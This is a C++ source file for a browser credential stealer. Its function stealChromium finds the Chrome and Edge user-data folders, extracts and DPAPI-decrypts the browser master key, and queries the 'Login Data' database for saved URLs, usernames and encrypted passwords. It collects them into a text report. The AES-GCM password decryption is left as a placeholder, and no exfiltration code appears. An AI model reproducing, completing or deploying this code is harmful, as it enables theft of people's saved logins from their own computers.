#include "credential/ChromiumStealer.h"

#include "crypto/Dpapi.h"
#include "nlohmann/json.hpp"
#include "sqlite3.h"

#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <shlobj.h>

namespace credential {

namespace {

std::vector<BYTE> getMasterKey(const std::filesystem::path& path) {
    std::ifstream file(path);
    nlohmann::json json;
    file >> json;
    std::string encryptedKeyB64 = json["os_crypt"]["encrypted_key"];

    // Base64 decode
    DWORD decodedLen = 0;
    CryptStringToBinaryA(encryptedKeyB64.c_str(), static_cast<DWORD>(encryptedKeyB64.length()), CRYPT_STRING_BASE64, NULL, &decodedLen, NULL, NULL);
    std::vector<BYTE> encryptedKey(decodedLen);
    CryptStringToBinaryA(encryptedKeyB64.c_str(), static_cast<DWORD>(encryptedKeyB64.length()), CRYPT_STRING_BASE64, encryptedKey.data(), &decodedLen, NULL, NULL);

    // Remove "DPAPI" prefix
    if (encryptedKey.size() > 5) {
        encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);
    }

    return crypto::decryptDpapi(encryptedKey);
}

// Placeholder for AES decryption
std::string decryptValue(const std::vector<BYTE>& /*value*/, const std::vector<BYTE>& /*masterKey*/) {
    // TODO: Implement AES GCM decryption
    return "decryption_placeholder";
}

} // namespace

std::string stealChromium() {
    std::string results;
    PWSTR localAppDataPath;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppDataPath))) {
        std::vector<std::filesystem::path> browserPaths = {
            std::filesystem::path(localAppDataPath) / "Google\\Chrome\\User Data",
            std::filesystem::path(localAppDataPath) / "Microsoft\\Edge\\User Data",
        };
        CoTaskMemFree(localAppDataPath);

        for (const auto& browserPath : browserPaths) {
            try {
                std::vector<BYTE> masterKey = getMasterKey(browserPath / "Local State");

                std::filesystem::path loginDataPath = browserPath / "Default" / "Login Data";
                if (std::filesystem::exists(loginDataPath)) {
                    sqlite3* db;
                    if (sqlite3_open(loginDataPath.string().c_str(), &db) == SQLITE_OK) {
                        sqlite3_stmt* stmt;
                        if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, NULL) == SQLITE_OK) {
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                std::string url = (const char*)sqlite3_column_text(stmt, 0);
                                std::string username = (const char*)sqlite3_column_text(stmt, 1);
                                const BYTE* encryptedPassword = (const BYTE*)sqlite3_column_blob(stmt, 2);
                                int encryptedPasswordLen = sqlite3_column_bytes(stmt, 2);

                                std::vector<BYTE> encryptedPasswordVec(encryptedPassword, encryptedPassword + encryptedPasswordLen);
                                std::string password = decryptValue(encryptedPasswordVec, masterKey);

                                results += "URL: " + url + "\nUsername: " + username + "\nPassword: " + password + "\n\n";
                            }
                        }
                        sqlite3_finalize(stmt);
                    }
                    sqlite3_close(db);
                }
            } catch (const std::exception&) {
                // Ignore errors and continue
            }
        }
    }
    return results;
}

} // namespace credential
